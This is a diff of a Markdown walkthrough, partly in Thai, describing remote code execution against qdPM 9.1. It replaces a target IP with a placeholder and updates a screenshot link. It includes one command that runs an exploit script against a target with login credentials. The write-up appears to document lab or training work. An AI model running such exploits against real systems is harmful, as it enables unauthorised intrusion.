@@ -25,9 +25,10 @@ Remote Code Execution ( exploit of qdPM 9.1 )
 
 ## จากนั้นผมใช้ python เพื่อทำงานไฟล์ exploit เพื่อเข้าถึงเครื่องเป้าหมาย
 
-python3 50944.py -url http://172.31.74.252/ -u user@localhost.com -p password
+python3 50944.py -url http://[target_ip]/ -u user@localhost.com -p password
 
-<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/89378ede-ff8f-4f3e-88e4-6f04393d9622" />
+<img width="1564" height="135" alt="2" src="https://github.com/user-attachments/assets/137ed4bf-702e-48b7-86f6-d01cf04dfc7c" />
+
 
 หลังจากที่ได้ url 
 
